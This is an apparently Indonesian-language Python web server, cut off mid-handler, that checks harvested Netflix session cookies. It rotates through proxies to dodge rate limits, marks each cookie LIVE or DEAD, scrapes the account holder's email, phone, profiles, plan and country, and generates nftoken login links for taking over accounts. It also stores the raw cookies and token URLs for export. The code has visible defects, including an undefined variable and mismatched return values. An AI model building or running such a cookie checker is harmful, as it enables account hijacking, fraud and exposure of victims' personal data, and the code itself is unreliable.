import csv
import http.server
import io
import json
import logging
import os
import random
import re
import socketserver
import sqlite3
import threading
import time
import urllib.parse
from datetime import datetime
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

PORT = int(os.environ.get("PORT", 8080))
PROXIES_FILE = "netflix_proxies.txt"
DB_FILE = "netflix_suite.db"
CONFIG_FILE = "suite_config.json"
LOG_FILE = "suite.log"
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

# Setup logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    encoding='utf-8'
)

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")

COUNTRY_CODE_NAMES = {
    'AR': 'Argentina', 'AU': 'Australia', 'BR': 'Brazil', 'CA': 'Canada',
    'DE': 'Germany', 'ES': 'Spain', 'FR': 'France', 'GB': 'United Kingdom',
    'ID': 'Indonesia', 'IN': 'India', 'IT': 'Italy', 'JP': 'Japan',
    'KR': 'South Korea', 'MY': 'Malaysia', 'MX': 'Mexico', 'NL': 'Netherlands',
    'PH': 'Philippines', 'SG': 'Singapore', 'TH': 'Thailand', 'TR': 'Turkey',
    'US': 'United States', 'VN': 'Vietnam',
}

db_lock = threading.Lock()
healthy_proxies = []
proxy_lock = threading.Lock()
server_start_time = time.time()

def get_config():
    if not os.path.exists(CONFIG_FILE):
        return {"pin": ""}
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {"pin": ""}

def save_config(cfg):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)

def get_db():
    conn = sqlite3.connect(DB_FILE, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL;")
    return conn

def init_db():
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                created_at TEXT,
                type TEXT,
                status TEXT,
                plan TEXT,
                billing TEXT,
                country TEXT,
                route TEXT,
                token_url TEXT,
                raw_cookie TEXT
            )
        ''')
        conn.commit()
        conn.close()

def save_history(entry_type, status, plan='', billing='', country='', route='', token_url='', raw_cookie=''):
    with db_lock:
        try:
            conn = get_db()
            c = conn.cursor()
            c.execute('''
                INSERT INTO history (created_at, type, status, plan, billing, country, route, token_url, raw_cookie)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                entry_type,
                status,
                plan,
                billing,
                country,
                route,
                token_url,
                raw_cookie
            ))
            conn.commit()
            conn.close()
            logging.info(f"Save history: [{entry_type}] {status} - Plan: {plan} - Country: {country}")
        except Exception as e:
            logging.error(f"Error saving history: {e}")

def get_history(limit=50, offset=0, search='', status='', plan=''):
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        query = 'SELECT id, created_at, type, status, plan, billing, country, route, token_url, raw_cookie FROM history WHERE 1=1'
        params = []

        if search:
            query += ' AND (country LIKE ? OR billing LIKE ? OR plan LIKE ? OR raw_cookie LIKE ?)'
            params.extend([f'%{search}%', f'%{search}%', f'%{search}%', f'%{search}%'])
        if status:
            query += ' AND status = ?'
            params.append(status)
        if plan:
            if plan == '4K':
                query += ' AND plan LIKE "%4K%"'
            else:
                query += ' AND plan NOT LIKE "%4K%"'

        # Count total
        count_query = 'SELECT COUNT(*) FROM (' + query + ')'
        c.execute(count_query, params)
        total = c.fetchone()[0]

        query += ' ORDER BY id DESC LIMIT ? OFFSET ?'
        params.extend([limit, offset])

        c.execute(query, params)
        rows = c.fetchall()
        conn.close()

        items = [
            {
                "id": r[0], "created_at": r[1], "type": r[2], "status": r[3],
                "plan": r[4], "billing": r[5], "country": r[6], "route": r[7],
                "token_url": r[8], "raw_cookie": r[9]
            }
            for r in rows
        ]
        return {"total": total, "items": items}

def export_history_csv(search='', status='', plan=''):
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        query = 'SELECT id, created_at, type, status, plan, billing, country, route, token_url, raw_cookie FROM history WHERE 1=1'
        params = []
        if search:
            query += ' AND (country LIKE ? OR billing LIKE ? OR plan LIKE ? OR raw_cookie LIKE ?)'
            params.extend([f'%{search}%', f'%{search}%', f'%{search}%', f'%{search}%'])
        if status:
            query += ' AND status = ?'
            params.append(status)
        if plan:
            if plan == '4K':
                query += ' AND (plan LIKE "%4K%" OR plan LIKE "%ULTRA%")'
            else:
                query += ' AND plan NOT LIKE "%4K%" AND plan NOT LIKE "%ULTRA%" AND plan != ""'
        query += ' ORDER BY id DESC'
        c.execute(query, params)
        rows = c.fetchall()
        conn.close()

        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(["ID", "Waktu", "Tipe", "Status", "Plan", "Billing", "Negara", "Route", "Token URL", "Raw Cookie"])
        for r in rows:
            safe_row = []
            for cell in r:
                s = str(cell) if cell is not None else ""
                if s and s[0] in ("=", "+", "-", "@", "\t", "\r"):
                    s = "'" + s
                safe_row.append(s)
            writer.writerow(safe_row)
        return output.getvalue()

def get_analytics():
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT status, COUNT(*) FROM history GROUP BY status')
        status_counts = dict(c.fetchall())
        c.execute('SELECT country, COUNT(*) FROM history WHERE country != "" AND country != "Unknown" GROUP BY country ORDER BY COUNT(*) DESC LIMIT 8')
        country_counts = dict(c.fetchall())
        c.execute('SELECT plan, COUNT(*) FROM history WHERE status = "LIVE" AND plan != "" GROUP BY plan ORDER BY COUNT(*) DESC LIMIT 6')
        plan_counts = dict(c.fetchall())
        conn.close()
        return {"status_counts": status_counts, "country_counts": country_counts, "plan_counts": plan_counts}

def clear_history(only_dead=False):
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        if only_dead:
            c.execute('DELETE FROM history WHERE status = "DEAD" OR status = "ERROR"')
            logging.info("Deleted only DEAD/ERROR history records.")
        else:
            c.execute('DELETE FROM history')
            logging.info("History database cleared completely.")
        conn.commit()
        conn.close()

def load_proxies():
    if not os.path.exists(PROXIES_FILE):
        return []
    res = []
    with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            p = line.strip()
            if not p or p.startswith("#"):
                continue
            parts = p.split(":")
            if len(parts) == 4:
                ip, port, user, pwd = parts
                res.append({"raw": f"{ip}:{port}", "proxy": f"http://{user}:{pwd}@{ip}:{port}", "latency": 0, "status": "OK"})
            elif len(parts) == 2:
                ip, port = parts
                res.append({"raw": f"{ip}:{port}", "proxy": f"http://{ip}:{port}", "latency": 0, "status": "OK"})
    return res

def check_proxy_health(p):
    t0 = time.time()
    try:
        proxies = {"http": p["proxy"], "https": p["proxy"]}
        r = requests.get("https://www.netflix.com/favicon.ico", proxies=proxies, timeout=5, verify=False)
        if r.status_code in (200, 301, 302, 404):
            latency = int((time.time() - t0) * 1000)
            return True, latency
    except Exception:
        pass
    return False, 0

def proxy_health_worker():
    global healthy_proxies
    while True:
        all_p = load_proxies()
        good = []
        for p in all_p:
            ok, lat = check_proxy_health(p)
            if ok:
                p["latency"] = lat
                p["status"] = "OK"
                good.append(p)
            else:
                p["status"] = "FAIL"
        with proxy_lock:
            healthy_proxies = good if good else all_p
        time.sleep(300)

def test_all_proxies_now():
    global healthy_proxies
    all_p = load_proxies()
    good = []
    
    # Concurrent ping testing using ThreadPoolExecutor for speed
    import concurrent.futures
    def _test_single(p):
        ok, lat = check_proxy_health(p)
        if ok:
            p["latency"] = lat
            p["status"] = "OK"
            return p
        else:
            p["status"] = "FAIL"
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
        results = list(ex.map(_test_single, all_p))
    
    good = [p for p in results if p is not None]
    with proxy_lock:
        healthy_proxies = good
    return all_p

proxy_cooldown = {}
proxy_cooldown_lock = threading.Lock()

def mark_proxy_cooldown(proxy_url, duration=600):
    if not proxy_url:
        return
    with proxy_cooldown_lock:
        proxy_cooldown[proxy_url] = time.time() + duration

def get_random_proxy():
    global healthy_proxies
    now = time.time()
    with proxy_lock:
        pool = list(healthy_proxies) if healthy_proxies else load_proxies()
    with proxy_cooldown_lock:
        valid_pool = [p for p in pool if proxy_cooldown.get(p["proxy"], 0) <= now]
    if not valid_pool:
        valid_pool = pool
    if not valid_pool:
        return None, None
    choice = random.choice(valid_pool)
    lat_info = f" ({choice.get('latency', 0)}ms)" if choice.get("latency") else ""
    return {"http": choice["proxy"], "https": choice["proxy"]}, f"{choice['raw']}{lat_info}", choice["proxy"]

def extract_cookie_values(text):
    cookie_dict = {}
    if not text:
        return cookie_dict

    text = str(text).strip()

    # If text is a full detail block with embedded JSON (e.g. NETFLIX ACCOUNT DETAILS ... [ { "name": "NetflixId" ... } ])
    json_match = re.search(r'\[\s*\{[\s\S]*?\}\s*\]', text)
    if json_match:
        try:
            parsed = json.loads(json_match.group(0))
            if isinstance(parsed, list):
                for c in parsed:
                    if isinstance(c, dict):
                        n, v = c.get("name"), c.get("value")
                        if n in COOKIE_KEYS and isinstance(v, str):
                            cookie_dict[n] = urllib.parse.unquote(v) if "%" in v else v
        except Exception:
            pass

    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#") or line.startswith("═") or line.startswith("█") or line.startswith("–"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            cookie_dict[parts[5]] = parts[6]

    try:
        data = json.loads(text)
    except Exception:
        data = None

    if isinstance(data, list):
        for c in data:
            if isinstance(c, dict):
                n, v = c.get("name"), c.get("value")
                if n in COOKIE_KEYS and isinstance(v, str):
                    cookie_dict[n] = urllib.parse.unquote(v) if "%" in v else v
    elif isinstance(data, dict):
        for k in COOKIE_KEYS:
            v = data.get(k)
            if isinstance(v, str):
                cookie_dict[k] = urllib.parse.unquote(v) if "%" in v else v

    for k in COOKIE_KEYS:
        if k not in cookie_dict:
            m = re.search(rf"(?<!\w){re.escape(k)}=([^;,\s]+)", text)
            if m:
                v = m.group(1)
                cookie_dict[k] = urllib.parse.unquote(v) if "%" in v else v

    for k in list(cookie_dict.keys()):
        if isinstance(cookie_dict[k], str):
            cookie_dict[k] = cookie_dict[k].strip().rstrip('.')

    return cookie_dict

def normalize_country(code):
    if not code:
        return 'Unknown'
    c = str(code).strip().upper()
    if len(c) == 2 and c.isalpha():
        return f"{COUNTRY_CODE_NAMES.get(c, c)} ({c})"
    return c

def generate_nftoken(cookie_text, use_proxy=True):
    cookies = extract_cookie_values(cookie_text)
    nid = cookies.get("NetflixId")
    if not nid:
        raise ValueError("Cookie NetflixId tidak ditemukan.")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={nid}"

    # Auto-retry exponential backoff max 1 retry
    max_retries = 1
    last_err = None

    for attempt in range(max_retries + 1):
        if use_proxy:
            proxies, proxy_label, proxy_raw_url = get_random_proxy()
        else:
            proxies, proxy_label, proxy_raw_url = None, None, None
        route = f"Proxy ({proxy_label})" if proxy_label else "Direct"

        try:
            res = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, proxies=proxies, timeout=18, verify=False)
            if res.status_code in (403, 429) and proxy_raw_url:
                mark_proxy_cooldown(proxy_raw_url, 600)
            res.raise_for_status()

            data = res.json()
            token_node = (
                (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
                or {}
            )
            token = token_node.get("token")
            expires = token_node.get("expires")
            if not token:
                raise ValueError("Netflix tidak mengembalikan token. Cookie mati/invalid.")

            exp_str = "Unknown"
            if isinstance(expires, (int, float)):
                ts = expires // 1000 if len(str(int(expires))) == 13 else expires
                exp_str = datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")

            token_url = f"https://netflix.com/?nftoken={token}"
            android_url = f"https://netflix.com/unsupported?nftoken={token}"
            tv_url = f"https://netflix.com/tv2?nftoken={token}"
            return token_url, android_url, tv_url, token, exp_str, route

        except Exception as e:
            last_err = e
            if attempt < max_retries:
                time.sleep(1.0 * (attempt + 1))
                continue

    raise last_err

def check_netflix_membership(cookie_text, use_proxy=True):
    cookies = extract_cookie_values(cookie_text)
    if "NetflixId" not in cookies:
        save_history("checker", "DEAD", raw_cookie=cookie_text)
        return {"live": False, "reason": "Cookie NetflixId tidak ditemukan."}

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.netflix.com/browse',
    }

    max_retries = 1
    last_err = None

    for attempt in range(max_retries + 1):
        if use_proxy:
            proxies, proxy_label, proxy_raw_url = get_random_proxy()
        else:
            proxies, proxy_label, proxy_raw_url = None, None, None
        route = f"Proxy ({proxy_label})" if proxy_label else "Direct"

        try:
            session = requests.Session()
            ck_header = "; ".join(f"{k}={v}" for k, v in cookies.items())
            headers['Cookie'] = ck_header

            r = session.get(
                'https://www.netflix.com/account/membership',
                headers=headers,
                proxies=proxies,
                timeout=7,
                allow_redirects=True,
                verify=False
            )

            if r.status_code in (403, 429) and proxy_raw_url:
                mark_proxy_cooldown(proxy_raw_url, 600)

            if "login" in r.url.lower() or r.status_code in (401, 403) or 'data-uia="login-page"' in r.text:
                save_history("checker", "DEAD", route=route, raw_cookie=cookie_text)
                return {"live": False, "reason": "Cookie Expired / Terlempar ke Login.", "route": route}

            html = r.text

            # 1. PLAN DETECTION
            plan_detected = 'Standard'
            # Check explicit localizedPlanName in reactContext / JSON state
            plan_json_match = re.search(r'"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', html)
            if plan_json_match:
                raw_p = plan_json_match.group(1).encode().decode('unicode_escape', errors='ignore')
                raw_p_lower = raw_p.lower()
                if 'iklan' in raw_p_lower or 'ads' in raw_p_lower:
                    plan_detected = 'Standard with Ads'
                elif 'ultra' in raw_p_lower or 'premium' in raw_p_lower or '4k' in raw_p_lower:
                    plan_detected = 'PREMIUM (ULTRA HD)'
                elif 'mobile' in raw_p_lower or 'ponsel' in raw_p_lower:
                    plan_detected = 'Mobile'
                elif 'dasar' in raw_p_lower or 'basic' in raw_p_lower:
                    plan_detected = 'Basic'
                else:
                    plan_detected = raw_p
            elif re.search(r'4K video resolution[^<]*?(?:spatial audio|ad-free)', html, re.I) or re.search(r'\bpremium\b', html, re.I):
                plan_detected = 'PREMIUM (ULTRA HD)'
            else:
                plan_match = re.search(r'data-uia="account-membership-page\+plan-card\+title"[^>]*>([^<]{1,30}?)<', html)
                if plan_match:
                    p_txt = plan_match.group(1).strip()
                    p_txt_lower = p_txt.lower()
                    if 'iklan' in p_txt_lower or 'ads' in p_txt_lower:
                        plan_detected = 'Standard with Ads'
                    elif 'ultra' in p_txt_lower or 'premium' in p_txt_lower:
                        plan_detected = 'PREMIUM (ULTRA HD)'
                    elif 'mobile' in p_txt_lower or 'ponsel' in p_txt_lower:
                        plan_detected = 'Mobile'
                    elif 'dasar' in p_txt_lower or 'basic' in p_txt_lower:
                        plan_detected = 'Basic'
                    else:
                        plan_detected = p_txt

            # 2. EMAIL EXTRACTION
            email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', html)
            if not email_match:
                email_match = re.search(r'"userEmail"\s*:\s*"([^"]+)"', html)
            if not email_match:
                email_match = re.search(r'data-uia="account-email"[^>]*>([^<]+)<', html)
            email = email_match.group(1).strip() if email_match else 'Account Valid'
            # Clean hex escapes if any
            if r'\x40' in email or r'\x' in email:
                try:
                    email = email.encode('utf-8').decode('unicode_escape')
                except Exception:
                    pass
                email = email.replace(r'\x40', '@')

            # 3. PHONE EXTRACTION
            phone_match = re.search(r'"phoneNumber"\s*:\s*"([^"]+)"', html)
            if not phone_match:
                phone_match = re.search(r'data-uia="account-phone"[^>]*>([^<]+)<', html)
            phone = phone_match.group(1).strip() if phone_match else 'None'
            if r'\x20' in phone:
                phone = phone.replace(r'\x20', ' ')

            # 4. PROFILES EXTRACTION
            profiles = []
            # Method A: match GraphQL Profile objects
            for pm in re.finditer(r'Profile:\{.*?\"name\":\"([^\"]+)\"', html):
                p_name = pm.group(1).strip()
                if p_name and p_name not in profiles and not p_name.lower().startswith(('paket', 'plan', 'standard', 'premium', 'basic', 'mobile')):
                    profiles.append(p_name)

            # Method B: fallback to profileName or guid name
            if not profiles:
                for pm in re.finditer(r'"profileName"\s*:\s*"([^"]+)"', html):
                    p_name = pm.group(1).encode().decode('unicode_escape', errors='ignore').strip()
                    if p_name and p_name not in profiles:
                        profiles.append(p_name)

            # 5. NEXT BILLING DATE
            date_match = re.search(r'"nextBillingDate"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', html)
            if date_match:
                billing = date_match.group(1).encode().decode('unicode_escape', errors='ignore').strip()
            else:
                date_dom_match = re.search(
                    r'data-uia="account-membership-page\+payments-card\+title"[^>]*>Next payment</h3>[^<]*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+?)</p>',
                    html, re.DOTALL | re.I
                )
                billing = date_dom_match.group(1).strip() if date_dom_match else 'Auto-renew active'

            # 6. MEMBER SINCE
            member_since_match = re.search(r'"memberSince"\s*:\s*"([^"]+)"', html)
            member_since = member_since_match.group(1).strip() if member_since_match else 'Active'

            # 7. COUNTRY
            country_match = re.search(r'"(?:countryOfSignup|currentCountry)"\s*:\s*"([A-Za-z]{2})"', html)
            if not country_match:
                country_match = re.search(r'"(?:memberCountry|geoCountry)"\s*:\s*"([A-Za-z]{2})"', html)
            country = normalize_country(country_match.group(1)) if country_match else 'Unknown'

            # Try generating nftoken simultaneously if possible
            nftoken_data = None
            try:
                t_url, a_url, tv_url, tok, exp, _ = generate_nftoken(cookie_text, use_proxy=use_proxy)
                nftoken_data = {
                    "url": t_url,
                    "android_url": a_url,
                    "tv_url": tv_url,
                    "token": tok,
                    "expires": exp
                }
            except Exception:
                pass
            editor_cookies = [
                {"domain": ".netflix.com", "name": k, "path": "/", "secure": True, "httpOnly": True, "value": v}
                for k, v in cookies.items()
            ]

            tok_link = (nftoken_data.get("url") if nftoken_data else "")
            save_history("checker", "LIVE", plan=plan_detected, billing=billing, country=country, route=route, token_url=tok_link, raw_cookie=cookie_text)

            return {
                "live": True,
                "email": email,
                "phone": phone,
                "plan": plan_detected,
                "billing": billing,
                "member_since": member_since,
                "profiles": profiles,
                "country": country,
                "cookies": editor_cookies,
                "token_data": nftoken_data,
                "route": route
            }
        except Exception as e:
            last_err = e
            if attempt < max_retries:
                time.sleep(1.0 * (attempt + 1))
                continue

    save_history("checker", "ERROR", route=route, raw_cookie=cookie_text)
    return {"live": False, "reason": f"Request gagal setelah retry: {str(last_err)}", "route": route}

# In-memory sliding window rate limiter
rate_limit_lock = threading.Lock()
ip_request_history = {}

def is_rate_limited(ip, max_requests=40, window_seconds=10):
    if not ip:
        return False
    now = time.time()
    with rate_limit_lock:
        timestamps = ip_request_history.get(ip, [])
        # prune timestamps older than window
        timestamps = [t for t in timestamps if now - t < window_seconds]
        if len(timestamps) >= max_requests:
            ip_request_history[ip] = timestamps
            return True
        timestamps.append(now)
        ip_request_history[ip] = timestamps
        return False

def check_pin_authorized(headers):
    cfg = get_config()
    req_pin = cfg.get("pin", "")
    if not req_pin:
        return True
    pin_header = headers.get("X-Suite-Pin") or headers.get("Authorization", "")
    if pin_header.startswith("Bearer "):
        pin_header = pin_header[7:].strip()
    return pin_header == req_pin

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_HEAD(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        if path in ("/", "/index.html"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.send_header("X-Frame-Options", "DENY")
            self.end_headers()
        elif path in ("/api/health", "/api/pin/status", "/api/proxies"):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
        else:
            self.send_response(200)
            self.end_headers()

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        qs = urllib.parse.parse_qs(parsed.query)

        if path in ("/", "/index.html"):
            html_file = os.path.join(os.path.dirname(__file__), "index.html")
            if os.path.exists(html_file):
                with open(html_file, "r", encoding="utf-8") as f:
                    content = f.read().encode("utf-8")
            else:
                content = b"<h1>index.html not found</h1>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.send_header("X-Frame-Options", "DENY")
            self.end_headers()
            self.wfile.write(content)

        elif path == "/api/health":
            uptime = int(time.time() - server_start_time)
            with proxy_lock:
                h_proxies = len(healthy_proxies)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            res = {
                "status": "healthy",
                "uptime_seconds": uptime,
                "timestamp": datetime.now().isoformat(),
                "healthy_proxies": h_proxies
            }
            self.wfile.write(json.dumps(res).encode("utf-8"))

        elif path == "/api/pin/status":
            cfg = get_config()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"enabled": bool(cfg.get("pin"))}).encode("utf-8"))

        elif path == "/api/proxies":
            all_p = load_proxies()
            with proxy_lock:
                h_count = len(healthy_proxies) if healthy_proxies else len(all_p)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"total": len(all_p), "healthy": h_count}).encode("utf-8"))

        elif path in ("/api/history", "/api/history/export_csv", "/api/analytics", "/api/proxies/detail"):
            if not check_pin_authorized(self.headers):
                self.send_response(401)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"error": "Unauthorized: PIN required"}')
                return

            if path == "/api/history":
                limit = int(qs.get("limit", [25])[0])
                offset = int(qs.get("offset", [0])[0])
                search = qs.get("search", [""])[0]
                status = qs.get("status", [""])[0]
                plan = qs.get("plan", [""])[0]

                data = get_history(limit=limit, offset=offset, search=search, status=status, plan=plan)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(data).encode("utf-8"))

            elif path == "/api/history/export_csv":
                search = q_params.get("search", [""])[0]
                status = q_params.get("status", [""])[0]
                plan = q_params.get("plan", [""])[0]
                csv_data = export_history_csv(search=search, status=status, plan=plan)
                self.send_response(200)
                self.send_header("Content-Type", "text/csv; charset=utf-8")
                self.send_header("Content-Disposition", f"attachment; filename=netflix_history_{int(time.time())}.csv")
                self.end_headers()
                self.wfile.write(csv_data.encode("utf-8"))

            elif path == "/api/analytics":
                an = get_analytics()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(an).encode("utf-8"))

            elif path == "/api/proxies/detail":
                raw_text = ""
                if os.path.exists(PROXIES_FILE):
                    with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
                        raw_text = f.read()
                with proxy_lock:
                    p_list = healthy_proxies if healthy_proxies else load_proxies()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"raw_text": raw_text, "list": p_list}).encode("utf-8"))

        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        clen = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(clen) if clen > 0 else b"{}"

        if self.path == "/api/pin/verify":
            try:
                p = json.loads(body.decode("utf-8"))
                cfg = get_config()
                req_pin = cfg.get("pin", "")
                ok = (not req_pin) or (p.get("pin") == req_pin)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"ok": ok}).encode("utf-8"))
            except Exception as e:
                self.send_response(400)
                self.end_headers()

        elif self.path == "/api/pin/set":
            try:
                p = json.loads(body.decode("utf-8"))
                cfg = get_config()
                cur_pin = cfg.get("pin", "")
                if cur_pin and p.get("current") != cur_pin:
                    self.send_response(401)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": False, "error": "PIN saat ini salah"}).encode("utf-8"))
                    return
                new_p = str(p.get("new_pin", "")).strip()
                if new_p and len(new_p) > 20:
                    self.send_response(400)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": False, "error": "PIN terlalu panjang (maks 20 karakter)"}).encode("utf-8"))
                    return
                cfg["pin"] = new_p
                save_config(cfg)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"ok": True}).encode("utf-8"))
            except Exception as e:
                self.send_response(400)
                self.end_headers()

        elif self.path in ("/api/token", "/api/check", "/api/proxies/save", "/api/proxies/test", "/api/history/clear"):
            client_ip = self.headers.get("CF-Connecting-IP") or self.headers.get("X-Forwarded-For") or self.client_address[0]
            if is_rate_limited(client_ip, max_requests=50, window_seconds=10):
                self.send_response(429)
                self.send_header("Content-Type", "application/json")
                self.send_header("Retry-After", "5")
                self.end_headers()
                self.wfile.write(b'{"error": "Too Many Requests. Rate limit exceeded."}')
                return

            if not check_pin_authorized(self.headers):
                self.send_response(401)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"error": "Unauthorized: PIN required"}')
                return

            if self.path == "/api/token":
                try:
                    p = json.loads(body.decode("utf-8"))
                    token_url, android_url, tv_url, token, exp, route = generate_nftoken(p.get("cookie", ""), use_proxy=p.get("use_proxy", True))
                    res = json.dumps({
                        "url": token_url,
                        "android_url": android_url,
                        "tv_url": tv_url,
                        "token": token,
                        "expires": exp,
                        "route": route
                    }).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"error": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/check":
                try:
                    p = json.loads(body.decode("utf-8"))
                    out = check_netflix_membership(p.get("cookie", ""), use_proxy=p.get("use_proxy", True))
                    res = json.dumps(out).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"live": False, "reason": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/proxies/save":
                try:
